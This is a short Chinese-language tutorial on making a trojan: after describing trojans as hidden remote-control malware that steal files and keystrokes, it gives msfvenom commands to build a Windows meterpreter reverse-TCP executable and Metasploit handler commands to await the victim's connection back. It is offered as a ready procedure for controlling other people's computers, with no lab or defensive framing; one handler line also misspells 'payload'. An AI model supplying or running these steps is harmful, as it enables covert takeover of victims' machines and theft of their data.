什么是木马?

木马就是一种恶意的远程控制窃取用户敏感信息的恶意软件,木马具有隐蔽性一般人是很难发现他的存在, 木马是不会发作没有任务栏图标没有窗口所以隐藏性很强

木马是用来控制别人电脑 例如查看别人电脑的文件系统对别人电脑里面的文件进行操作也会用来记录你键盘的点击和操作,木马会悄悄地 躲在你电脑里面窃取隐私信息发给黑客 任意接收黑客发送的命令并且执行

1.开始生成木马

使用msf的msfvenom工具进行木马的生成语法:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=本地IP地址 LPORT=要监听的端口 -f exe -o 程序名称.exe

例如:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.93 LPORT=9999 -f exe -o mm.exe

在根目录里生成了一个木马可执行文件

2.监听木马端口

第一步:

开始监听木马

use exploit/multi/handler //使用这个模块

set playload windows/meterpreter/reverse_tcp//设置攻击负荷

set lhost 192.168.42.93 //在这里设置本地的IP地址

set lport 9999 //这里设置端口要和木马设置的端口保持一致

exploit//开始攻击

木马处于监听状态 等到别人点击木马了你这里就会出现控制台
